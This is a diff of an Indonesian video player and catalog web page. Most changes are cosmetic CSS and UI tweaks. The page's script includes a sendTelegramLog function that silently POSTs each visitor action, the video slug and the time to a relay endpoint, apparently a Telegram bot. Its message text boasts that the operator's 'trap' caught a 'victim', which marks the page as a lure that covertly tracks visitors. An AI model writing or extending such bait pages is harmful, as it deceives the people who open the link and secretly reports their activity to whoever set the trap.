@@ -46,7 +46,7 @@
         .btn-play-elegan i { font-size: 14px; color: #e1e1e1; }
         .btn-play-elegan:active { transform: scale(0.96); background: rgba(50, 50, 60, 0.95); }
         
-        /* Mode Katalog Homepage Canggih */
+        /* Mode Katalog Homepage */
         #katalogSection { display: none; padding: 20px 16px; }
         .katalog-header {
             font-size: 16px; font-weight: 700; margin-bottom: 16px;
@@ -77,7 +77,7 @@
         }
         .custom-checkbox i { display: none; font-size: 12px; color: #fff; }
         .video-item.selected .custom-checkbox {
-            background: #2563eb; border-color: #3b82f6;
+            background: rgba(255, 255, 255, 0.2); border-color: rgba(255, 255, 255, 0.5);
         }
         .video-item.selected .custom-checkbox i { display: block; }
 
@@ -88,7 +88,7 @@
         }
         .video-slug-sub { font-size: 11px; color: #94a3b8; }
         
-        /* Tombol Aksi Kanan (Buka Video & Salin Single) */
+        /* Tombol Aksi Kanan (Semua Warna Seragam Abu Netral) */
         .item-actions { display: flex; align-items: center; gap: 6px; }
         .btn-action {
             background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.15); color: #fff;
@@ -97,9 +97,8 @@
             transition: all 0.2s;
         }
         .btn-action:active { transform: scale(0.95); background: rgba(255, 255, 255, 0.2); }
-        .btn-buka { background: rgba(37, 99, 235, 0.2); border-color: rgba(59, 130, 246, 0.4); color: #60a5fa; }
         
-        /* Bar Melayang Untuk Bulk Copy */
+        /* Bar Melayang Untuk Bulk Copy (Warna Diseragamkan) */
         .bulk-copy-bar {
             position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
             width: calc(100% - 32px); max-width: 448px;
@@ -110,11 +109,11 @@
         }
         .selected-count { font-size: 13px; font-weight: 600; color: #e1e1e1; }
         .btn-bulk-copy {
-            background: #2563eb; color: #fff; border: none; padding: 8px 16px;
-            border-radius: 6px; font-size: 13px; font-weight: 700; cursor: pointer;
+            background: rgba(255, 255, 255, 0.15); color: #fff; border: 1px solid rgba(255, 255, 255, 0.25); 
+            padding: 8px 16px; border-radius: 6px; font-size: 13px; font-weight: 700; cursor: pointer;
             display: flex; align-items: center; gap: 8px; transition: background 0.2s;
         }
-        .btn-bulk-copy:active { transform: scale(0.96); background: #1d4ed8; }
+        .btn-bulk-copy:active { transform: scale(0.96); background: rgba(255, 255, 255, 0.3); }
 
         .toast {
             position: fixed; bottom: 85px; left: 50%; transform: translateX(-50%);
@@ -131,7 +130,6 @@
 <body>
 
 <div class="container">
-    <!-- MODE PLAYER -->
     <div id="playerSection" style="display: none;">
         <div class="video-wrapper">
             <video id="videoPolos" controls playsinline preload="metadata" muted controlslist="nodownload" disablePictureInPicture>
@@ -145,7 +143,6 @@
         </div>
     </div>
 
-    <!-- MODE KATALOG HOMEPAGE -->
     <div id="katalogSection">
         <div class="katalog-header">
             <div class="katalog-header-title">
@@ -159,7 +156,6 @@
     <div id="errorMessage">Video tidak ditemukan di sistem.</div>
 </div>
 
-<!-- BAR MELAYANG BULK COPY -->
 <div id="bulkCopyBar" class="bulk-copy-bar">
     <div class="selected-count" id="selectedCountText">0 Video Terpilih</div>
     <button class="btn-bulk-copy" onclick="salinSemuaTerpilih()">
@@ -167,7 +163,7 @@
     </button>
 </div>
 
-<div id="toast" class="toast">Link berhasil disalin! </div>
+<div id="toast" class="toast">Link berhasil disalin! 🚀</div>
 
 <script>
 let selectedSlugs = new Set();
@@ -196,7 +192,7 @@ document.addEventListener("DOMContentLoaded", function () {
     function sendTelegramLog(eventTitle, detailInfo = '') {
         if (!WORKER_URL || WORKER_URL.includes('namakamu')) return;
         const timeNow = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-        const message = ` <b>[Haha Woy Bossku Aa Regge Jebakan Lu Kena Tuh]</b>\n <b>Ada Mangsa Kena Sambaran Hih Mampus Kan!</b>\n <b>Aksi:</b> ${eventTitle}\n <b>Target Video:</b> <code>${slug || 'Direct Landing'}</code>\n <b>Waktu:</b> ${timeNow}\n${detailInfo ? ` <b>Detail:</b> ${detailInfo}\n` : ''}`;
+        const message = `🤣 <b>[Haha Woy Bossku Aa Regge Jebakan Lu Kena Tuh]</b>\n🔥 <b>Ada Mangsa Kena Sambaran Hih Mampus Kan!</b>\n📌 <b>Aksi:</b> ${eventTitle}\n🎬 <b>Target Video:</b> <code>${slug || 'Direct Landing'}</code>\n🕒 <b>Waktu:</b> ${timeNow}\n${detailInfo ? `ℹ️ <b>Detail:</b> ${detailInfo}\n` : ''}`;
 
         fetch(WORKER_URL, {
             method: 'POST',
@@ -276,7 +272,7 @@ document.addEventListener("DOMContentLoaded", function () {
                     </div>
                 </div>
                 <div class="item-actions">
-                    <button class="btn-action btn-buka" onclick="bukaVideoDirect('${key}')" title="Tonton Video">
+                    <button class="btn-action" onclick="bukaVideoDirect('${key}')" title="Tonton Video">
                         <i class="fa-solid fa-play"></i> Buka
                     </button>
                     <button class="btn-action" onclick="salinSatuLink('${fullVideoUrl}')" title="Salin Link">
@@ -337,12 +333,10 @@ document.addEventListener("DOMContentLoaded", function () {
     });
 });
 
-/* Buka Video Langsung Tanpa Reload Page */
 function bukaVideoDirect(key) {
     window.location.href = `?v=${key}`;
 }
 
-/* LOGIKA CENTANG & BULK COPY */
 function toggleSelectVideo(slugKey) {
     const item = document.getElementById(`item-${slugKey}`);
     if (selectedSlugs.has(slugKey)) {
@@ -394,6 +388,7 @@ function salinSatuLink(url) {
     prosesSalin(url);
 }
 
+// FUNGSI BULK COPY DENGAN BARIS KOSONG (\n\n)
 function salinSemuaTerpilih() {
     const baseUrl = window.location.origin + window.location.pathname;
     let listUrl = [];
@@ -402,7 +397,8 @@ function salinSemuaTerpilih() {
         listUrl.push(`${baseUrl}?v=${key}`);
     });
 
-    const hasillink = listUrl.join("\n");
+    // Pake \n\n biar ada enter/spasi antar link!
+    const hasillink = listUrl.join("\n\n");
     prosesSalin(hasillink);
 }
 
